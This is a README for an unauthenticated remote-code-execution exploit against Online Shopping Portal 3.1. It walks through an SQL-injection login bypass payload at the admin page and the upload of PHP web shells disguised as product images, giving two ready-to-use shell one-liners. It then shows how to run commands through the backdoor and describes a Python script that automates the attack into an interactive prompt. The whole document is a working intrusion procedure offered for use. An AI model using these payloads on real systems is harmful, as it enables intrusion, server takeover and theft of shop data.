# Online Shopping Portal 3.1 - Remote Code Execution (Unauthenticated)

Date: 17.07.2021\
Exploit Author: D3duct1V\
Original Exploit Author: Tagoletta (Tağmaç)\
Original EDB-ID: 50029\
Software Link: https://phpgurukul.com/shopping-portal-free-download/ \
Version: v3.1\
Tested on: Windows

---
# Manual Exploit Details

The exploit utilizes multiple vulnerabilities first bypasses authentication then allows for file php file upload. 

## Authentication Bypass

Navagate to the Admin login page: `http://<site>/shopping/admin` \
* Username: `'OR 1=1'--` \
* Password: whatever
  
## File upload vulnerability

After bypassing the authentication navagate to the "Add a new product" \
Here insert whatever data into the fields until the picture. \
The image file should be a php file with the command execution such the following:
  1. `<?php $exe = shell_exec($_REQUEST['cmd']); echo $exe; ?>`
  2. `<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>`

## Interacting with the backdoor

Search for the newly uploaded "product" and locate the image URL. \
Then use curl to interact with the backdoor: `http://<site>/shopping/admin/productimages/1/<image>.php?cmd=hostname` 

# Automated attack

Running the python script found within this repo uses Python 3 and needs the requests package \
The script can be started `# python3 script.py -u <target URL minus /shopping>` 

The script will bypass the authentication upload a backdoor with a product name and image name. \
It will then find the backdoor and attempt to connect to and run a current directory echo command. \
Once successful will drop into a interactive command prompt, this will run system commands but not a full shell. 

# Metasploit module

Coming.

